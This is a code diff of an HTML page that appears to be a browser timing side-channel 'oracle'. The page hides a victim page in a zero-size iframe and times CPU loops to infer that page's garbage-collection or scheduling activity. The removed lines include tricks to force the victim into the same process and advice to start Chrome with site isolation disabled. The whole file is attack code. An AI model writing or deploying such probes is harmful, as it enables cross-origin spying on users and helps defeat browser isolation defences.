@@ -1,11 +1,11 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>GC Oracle FINAL AUTO</title>
+<title>Scheduler Oracle FINAL</title>
 
-<h2>GC Oracle FINAL (Auto Detect)</h2>
+<h2>Scheduler Contention Oracle</h2>
 <pre id="log"></pre>
 
-<iframe id="f" style="width:0;height:0;border:0"></iframe>
+<iframe src="/spoof/victim.html" style="width:0;height:0;border:0"></iframe>
 
 <script>
 const log = m => {
@@ -13,67 +13,40 @@ const log = m => {
   console.log(m)
 }
 
-// ===== FORCE SAME PROCESS (best effort) =====
-const f = document.getElementById('f')
-f.src = "about:blank"
-f.onload = () => {
-  f.contentWindow.location = "/spoof/victim.html"
-}
-
-// ===== HEAVY PROBE =====
+// ===== HIGH RESOLUTION TASK =====
 function probe() {
   const t0 = performance.now()
 
-  let arr = []
-  for (let i = 0; i < 60000; i++) {
-    arr.push({a:i, b:i+1})
+  let x = 0
+  for (let i = 0; i < 5e6; i++) {
+    x += i
   }
-
-  // typed array (lebih sensitif GC)
-  let buf = new Uint8Array(1024 * 512)
 
   return performance.now() - t0
 }
 
-// ===== MULTI SAMPLE =====
+// ===== SAMPLING =====
 function measure() {
   let sum = 0
-  for (let i = 0; i < 3; i++) {
-    sum += probe()
-  }
+  for (let i = 0; i < 3; i++) sum += probe()
   return sum / 3
 }
 
-// ===== TRACK =====
 let history = []
-let detected = false
 
 setInterval(() => {
   const t = measure()
   history.push(t)
 
-  if (history.length > 30) history.shift()
+  if (history.length > 20) history.shift()
 
   const avg = history.reduce((a,b)=>a+b,0)/history.length
 
   let state = "IDLE"
-  if (t > 8) state = "GC SPIKE 🔥"
-  if (t > 15) state = "HEAVY GC 💣"
-
-  if (t > 8) detected = true
+  if (t > avg * 1.5) state = "BUSY 🔥"
+  if (t > avg * 2.5) state = "HEAVY LOAD 💣"
 
   log(`t=${t.toFixed(2)} avg=${avg.toFixed(2)} => ${state}`)
 
-}, 120)
-
-// ===== FAIL DETECTION =====
-setTimeout(() => {
-  if (!detected) {
-    log("\n[!] No GC signal detected")
-    log("[!] Likely different process (Site Isolation aktif)")
-    log("[!] Coba:")
-    log("    - buka di tab yang sama")
-    log("    - pakai Chrome --disable-site-isolation-trials")
-  }
-}, 8000)
+}, 150)
 </script>
